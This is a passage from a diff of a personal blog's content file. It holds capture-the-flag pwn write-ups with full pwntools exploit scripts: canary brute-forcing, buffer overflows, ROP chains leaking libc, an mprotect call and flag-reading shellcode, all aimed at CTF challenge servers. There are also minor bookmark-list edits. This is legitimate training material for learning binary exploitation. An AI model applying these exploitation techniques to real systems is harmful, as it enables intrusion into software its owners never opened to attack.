(0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = [b&#x27;&#x27; for i in range(8)]</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    for b in range(256):</span><br><span class="line">        bb = b.to_bytes(0x1,&quot;little&quot;)</span><br><span class="line">        io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">        # 0x30 -0x8 = 0x28</span><br><span class="line">        stack = flat(&#123;</span><br><span class="line">            0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">            0x28: canary[:i:],</span><br><span class="line">            0x28+i: bb</span><br><span class="line">        &#125;)</span><br><span class="line">        lp(&quot;guessing canary #%d bytes with byte %x: &quot; % (i,b),stack)</span><br><span class="line">        io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line">        result = io.recvuntil(b&quot;\n&quot;)</span><br><span class="line">        # canary bytes found</span><br><span class="line">        if result.startswith(b&quot;That wasn&#x27;t the exit.&quot;):</span><br><span class="line">            lp(&quot;canary #%d bytes found %x: &quot; % (i,b))</span><br><span class="line">            canary[i] = bb</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">log_print(&quot;canary leak&quot;, canary)</span><br><span class="line">cave_exit_addr = exe.sym[&quot;cave_exit&quot;]</span><br><span class="line">log_print(&quot;cave_exit addr&quot;, hex(cave_exit_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Give up.\n&quot;,b&#x27;1&#x27;)</span><br><span class="line">stack = flat(&#123;</span><br><span class="line">        0x0: b&#x27;A&#x27;*0x28,</span><br><span class="line">        0x28: canary,</span><br><span class="line">        0x30: b&#x27;A&#x27;*8,</span><br><span class="line">        0x30+0x8: [</span><br><span class="line">            ret_addr,</span><br><span class="line">            cave_exit_addr</span><br><span class="line">        ]</span><br><span class="line">    &#125;)</span><br><span class="line">log_print(&quot;sending payload&quot;,stack)</span><br><span class="line">io.sendafter(b&quot;9223372036854775807)\n&quot;,stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>maple{f0110W_T4E_B1rB5_T0_TH3_3x1T_562asddw126}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>canary bruteforcing</tag>
       </tags>
   </entry>
   <entry>
@@ -3864,6 +3864,7 @@ https://www.bsfdvbsbilibili.com
     <content><![CDATA[<ul>
 <li><a href="./cs/">计算机</a></li>
 <li><a href="./acg/">二次元</a></li>
+<li><a href="./ai/">AI</a></li>
 </ul>
 ]]></content>
   </entry>
@@ -3973,7 +3974,7 @@ https://www.bsfdvbsbilibili.com
 <li><a href="http://www.dudulu.moe/">嘟嘟噜二次元的理想乡 - 好用又好玩的追番网站</a></li>
 </ul>
 <h2 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h2><ul>
-<li><a href="https://www.agefans.cc/">在线动画 动漫下载 - AGE动漫</a></li>
+<li><a href="https://www.agemys.org/">在线动画 动漫下载 - AGE动漫</a></li>
 <li><a href="http://www.yhdm.so/">樱花动漫－专注动漫的门户网站</a></li>
 <li><a href="https://www.dqsj.cc/">大千视界_打驴动漫「无广告」所有樱花动漫番剧免费看</a></li>
 <li><a href="https://omofun.tv/">OmoFun动漫视频网 - (￣﹃￣)~omO</a></li>
@@ -3986,6 +3987,7 @@ https://www.bsfdvbsbilibili.com
 <li><a href="http://susudm.com/">速速动漫</a></li>
 <li><a href="http://www.bimiacg.net/">M站 哔咪动漫</a></li>
 <li><a href="https://hanime1.me/">Hanime1.me</a></li>
+<li><a href="https://www.mikudm.com/">异世界动漫</a></li>
 </ul>
 <h1 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h1><ul>
 <li><a href="https://www.mhgui.com/">漫画柜</a></li>
@@ -3996,12 +3998,22 @@ https://www.bsfdvbsbilibili.com
 <li><a href="https://www.linovelib.com/">哔哩轻小说</a></li>
 <li><a href="http://205library.blogspot.com/">205 藏书馆</a></li>
 <li><a href="https://www.acgndog.com/category/qingxiaoshuo">轻小说 – 次元狗</a></li>
+<li><a href="https://mobinovels.com/">魔笔小说</a></li>
 </ul>
 <h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
 <li><a href="https://hmacg.cn/">H萌 - 你我共同的二次元家园！</a></li>
 <li><a href="http://www.acgjc.com/">动漫无损音乐下载资讯站_ACG漫音社_专注分享二次元高品质音乐~</a></li>
 <li><a href="https://xygalgame.com/">初音的青葱网发布页</a></li>
 <li><a href="https://www.biliplus.com/">首页 - BiliPlus - ( ゜- ゜)つロ 乾杯~</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>AI Bookmarks</title>
+    <url>/bookmarks/ai/index.html</url>
+    <content><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
+<li><a href="https://chat.openai.com/">Chat GPT</a></li>
+<li><a href="https://www.chatpdf.com/">Chat PDF</a></li>
 </ul>
 ]]></content>
   </entry>
@@ -4013,6 +4025,7 @@ https://www.bsfdvbsbilibili.com
 <li><a href="https://carbon.now.sh/">Carbon - Code Image Generator</a></li>
 <li><a href="https://jsoneditoronline.org/">Json Editor</a></li>
 <li><a href="http://blog.luckly-mjw.cn/tool-show/m3u8-downloader/index.html">M3U8 下载</a></li>
+<li><a href="https://jsonformatter.org/json-to-python">JSON To Python Class</a></li>
 </ul>
 <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><ul>
 <li><a href="https://book.hacktricks.xyz/welcome/readme">hacktricks</a></li>
@@ -5051,16 +5064,6 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
-    <title>PicoCTF 2023</title>
-    <url>/ctf-writeup/2023/picoctf/index.html</url>
-    <content><![CDATA[<h1 id="PicoCTF-2023"><a href="#PicoCTF-2023" class="headerlink" title="PicoCTF 2023"></a>PicoCTF 2023</h1><p><a href="https://play.picoctf.org/">https://play.picoctf.org/</a></p>
-<p><strong>pwn full clear</strong></p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li>todo</li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
     <title>MagpieCTF 2023</title>
     <url>/ctf-writeup/2023/magpiectf/index.html</url>
     <content><![CDATA[<h1 id="MagpieCTF-2023"><a href="#MagpieCTF-2023" class="headerlink" title="MagpieCTF 2023"></a>MagpieCTF 2023</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
@@ -5068,6 +5071,16 @@ https://www.bsfdvbsbilibili.com
 <h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><p>this ctf is literally a guessing game.</p>
 <h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
 <li><a href="./writeup">writeup</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>PicoCTF 2023</title>
+    <url>/ctf-writeup/2023/picoctf/index.html</url>
+    <content><![CDATA[<h1 id="PicoCTF-2023"><a href="#PicoCTF-2023" class="headerlink" title="PicoCTF 2023"></a>PicoCTF 2023</h1><p><a href="https://play.picoctf.org/">https://play.picoctf.org/</a></p>
+<p><strong>pwn full clear</strong></p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li>todo</li>
 </ul>
 ]]></content>
   </entry>
@@ -5233,6 +5246,22 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
+    <title>[Pwn] wah [Angstrom CTF 2022]</title>
+    <url>/ctf-writeup/2022/angstrom/pwn/wah/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Baby friendly!</p>
+<p>nc challs.actf.co 31224</p>
+<p>Author: JoshDaBosh</p>
+<p>files: <a href="wah">wah</a>, <a href="wah.c">wah.c</a></p>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>simple buffer overflow, overwrite rip to <code>sym.flag</code></p>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = connect(&quot;challs.actf.co&quot;,31224)</span><br><span class="line">exe = context.binary = ELF(&quot;wah&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Cry: &quot;,flat(&#123;</span><br><span class="line">    0x20+0x8: exe.sym[&quot;flag&quot;]</span><br><span class="line">&#125;))</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}</p>
+]]></content>
+  </entry>
+  <entry>
     <title>[Pwn] really obnoxious problem [Angstrom CTF 2022]</title>
     <url>/ctf-writeup/2022/angstrom/pwn/really_obnoxious_problem/index.html</url>
     <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>You know the drill.</p>
@@ -5247,22 +5276,6 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = connect(&quot;challs.actf.co&quot;,31225)</span><br><span class="line">exe = context.binary = ELF(&quot;really_obnoxious_problem&quot;)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"># pop_rsi_ret_addr = exe_rop.find_gadget([&#x27;pop rsi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">io.sendlineafter(b&quot;Name:&quot;,b&quot;bobby&quot;+b&#x27;A&#x27;*(49-5))</span><br><span class="line">io.sendlineafter(b&quot;Address:&quot;,flat(&#123;</span><br><span class="line">    0x40+0x8:[</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0x1337,</span><br><span class="line">        0x00000000004013f1, # pop rsi, pop something ret</span><br><span class="line">        exe.symbols[&quot;name&quot;],</span><br><span class="line">        0,</span><br><span class="line">        exe.sym[&quot;flag&quot;]</span><br><span class="line">    ]&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{so_swe3t_so_c0ld_so_f4ir_7167cfa2c019}</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] wah [Angstrom CTF 2022]</title>
-    <url>/ctf-writeup/2022/angstrom/pwn/wah/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Baby friendly!</p>
-<p>nc challs.actf.co 31224</p>
-<p>Author: JoshDaBosh</p>
-<p>files: <a href="wah">wah</a>, <a href="wah.c">wah.c</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>simple buffer overflow, overwrite rip to <code>sym.flag</code></p>
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = connect(&quot;challs.actf.co&quot;,31224)</span><br><span class="line">exe = context.binary = ELF(&quot;wah&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Cry: &quot;,flat(&#123;</span><br><span class="line">    0x20+0x8: exe.sym[&quot;flag&quot;]</span><br><span class="line">&#125;))</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}</p>
 ]]></content>
   </entry>
   <entry>
@@ -5820,6 +5833,23 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
+    <title>[Pwn] Trivial [Tamu CTF 2022]</title>
+    <url>/ctf-writeup/2022/tamuctf/pwn/trivial/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: nhwn</p>
+<p>Feeling lucky? I have just the challenge for you :D</p>
+<p>SNI: lucky</p>
+<p>files: <a href="trivial">trivial</a>, <a href="trivial.c">trival.c</a></p>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>Very trivial buffer overflow in main. Overwrite rip to function win to get a shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">    char buff[69];</span><br><span class="line"></span><br><span class="line">    gets(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = ELF(&quot;trivial&quot;)</span><br><span class="line"></span><br><span class="line">p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;trivial&quot;)</span><br><span class="line">p.sendline(flat(&#123;</span><br><span class="line">    0x50+0x8:[</span><br><span class="line">        0x00401132</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{sorry_for_using_the_word_trivial}</p>
+]]></content>
+  </entry>
+  <entry>
     <title>[Pwn] Rop Golf [Tamu CTF 2022]</title>
     <url>/ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html</url>
     <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: sky</p>
@@ -5845,23 +5875,6 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;rop_golf_patched&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;rop-golf&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">    # Arch:     amd64-64-little</span><br><span class="line">    # RELRO:    Partial RELRO</span><br><span class="line">    # Stack:    No canary found</span><br><span class="line">    # NX:       NX enabled</span><br><span class="line">    # PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">writable_addr = 0x0000000000404800</span><br><span class="line"></span><br><span class="line">rop_1 = flat(&#123;</span><br><span class="line">    32: b&#x27;00000000&#x27;,</span><br><span class="line">    32+8: [</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[&#x27;puts&#x27;],</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        exe.sym[&quot;vuln&quot;]</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">log_print(&quot;pop rdi ret&quot;,hex(pop_rdi_ret_addr))</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;hi!\n&quot;,rop_1)</span><br><span class="line">puts_addr = int.from_bytes(io.recvuntil(b&#x27;\n&#x27;,drop=True),&quot;little&quot;)</span><br><span class="line">log_print(&quot;puts addr&quot;,hex(puts_addr))</span><br><span class="line">libc_base_addr = puts_addr - libc.sym[&quot;puts&quot;]</span><br><span class="line">log_print(&quot;libc base addr&quot;,hex(libc_base_addr))</span><br><span class="line"></span><br><span class="line">log_print(next(libc.search(b&quot;%p\0&quot;)))</span><br><span class="line">log_print(&quot;bin sh&quot;,hex(libc_base_addr + next(libc.search(b&quot;.\0&quot;))))</span><br><span class="line"></span><br><span class="line">log_print(libc.sym[&quot;opendir&quot;])</span><br><span class="line"></span><br><span class="line">log_print(&quot;mprotect&quot;,libc.sym[&quot;mprotect&quot;])</span><br><span class="line"></span><br><span class="line">pop_rsi_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;pop rsi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdx_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;pop rdx&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">leave_ret_addr = libc_base_addr + libc_rop.find_gadget([&#x27;leave&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line">mov_rdx_rax_ret_addr = libc_base_addr + 0x0000000000115dff</span><br><span class="line">push_rdx_ret_addr = libc_base_addr + 0x0000000000117171</span><br><span class="line">add_rax_1_ret_addr = libc_base_addr + 0x00000000000b4a00</span><br><span class="line">add_rax_3_ret_addr = libc_base_addr + 0x00000000000b4a10</span><br><span class="line"></span><br><span class="line">log_print(&quot;pop rsi ret&quot;,hex(pop_rsi_ret_addr))</span><br><span class="line">log_print(&quot;pop rdx ret&quot;,hex(pop_rdx_ret_addr))</span><br><span class="line">log_print(&quot;leave ret&quot;,hex(leave_ret_addr))</span><br><span class="line"></span><br><span class="line">rop_2 = flat(&#123;</span><br><span class="line">    32+8: [</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        0x200,</span><br><span class="line">        exe.sym[&quot;read&quot;],</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line">io.send(rop_2)</span><br><span class="line">shellcode_mov_rdi_rax_ret = asm(shellcraft.mov(&quot;rdi&quot;,&quot;rax&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_rdi_rax_ret_addr = writable_addr</span><br><span class="line"></span><br><span class="line">shellcode_mov_r15_rdi_ret = asm(shellcraft.mov(&quot;r15&quot;,&quot;rdi&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_r15_rdi_ret_addr = mov_rdi_rax_ret_addr + len(shellcode_mov_rdi_rax_ret)</span><br><span class="line"></span><br><span class="line">shellcode_mov_rdi_r15_ret = asm(shellcraft.mov(&quot;rdi&quot;,&quot;r15&quot;))+asm(shellcraft.ret())</span><br><span class="line">mov_rdi_r15_ret_addr = mov_r15_rdi_ret_addr + len(shellcode_mov_r15_rdi_ret)</span><br><span class="line"></span><br><span class="line">shellcode_add_rax_19_ret = bytes.fromhex(&quot;4883c013c3&quot;)</span><br><span class="line">add_rax_19_ret_addr = mov_rdi_r15_ret_addr + len(shellcode_mov_rdi_r15_ret)</span><br><span class="line"></span><br><span class="line">shellcode_read_file = b&#x27;&#x27;.join([</span><br><span class="line">    asm(shellcraft.read(0, writable_addr+0x100, 100)),</span><br><span class="line">    asm(shellcraft.open(writable_addr+0x100, 0)),</span><br><span class="line">    asm(shellcraft.read(&#x27;rax&#x27;, writable_addr+0x100, 100)),</span><br><span class="line">    asm(shellcraft.write(1, writable_addr+0x100, 100))])</span><br><span class="line"></span><br><span class="line">read_file_addr = add_rax_19_ret_addr + len(shellcode_add_rax_19_ret)</span><br><span class="line"></span><br><span class="line">flag_file_name = b&quot;066A2462DEB399BA9183A91FC116914C.txt&quot;</span><br><span class="line"></span><br><span class="line"># log_print(hex(mov_rdi_rax_ret_addr),hex(mov_rdx_rdi_ret_addr),hex(mov_rdi_rdx_ret_addr))</span><br><span class="line">final_shellcodes = shellcode_mov_rdi_rax_ret+shellcode_mov_r15_rdi_ret+shellcode_mov_rdi_r15_ret + shellcode_add_rax_19_ret + shellcode_read_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_3 = flat(&#123;</span><br><span class="line">    32+8: [</span><br><span class="line">        b&#x27;AAAAAAAA&#x27;,</span><br><span class="line">        b&#x27;BBBBBBBB&#x27;,</span><br><span class="line">        b&#x27;CCCCCCCC&#x27;,</span><br><span class="line">        # make it rwx</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0x0000000000404000,</span><br><span class="line">        pop_rsi_ret_addr,</span><br><span class="line">        0x1000,</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        1|2|4,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;mprotect&quot;],</span><br><span class="line">        # writing some gadget</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0,</span><br><span class="line">        pop_rsi_ret_addr,</span><br><span class="line">        writable_addr,</span><br><span class="line">        pop_rdx_ret_addr,</span><br><span class="line">        0x100,</span><br><span class="line">        exe.sym[&quot;read&quot;],</span><br><span class="line">        # print first filename</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        libc_base_addr + next(libc.search(b&quot;.\0&quot;)),</span><br><span class="line">        libc_base_addr + libc.sym[&quot;opendir&quot;],</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        mov_r15_rdi_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        mov_rdi_r15_ret_addr,</span><br><span class="line">        libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        add_rax_19_ret_addr,</span><br><span class="line">        mov_rdi_rax_ret_addr,</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        # mov_rdi_r15_ret_addr,</span><br><span class="line">        # libc_base_addr + libc.sym[&quot;readdir&quot;],</span><br><span class="line">        # add_rax_19_ret_addr,</span><br><span class="line">        # mov_rdi_rax_ret_addr,</span><br><span class="line">        # exe.sym[&quot;puts&quot;],</span><br><span class="line">        read_file_addr</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"># 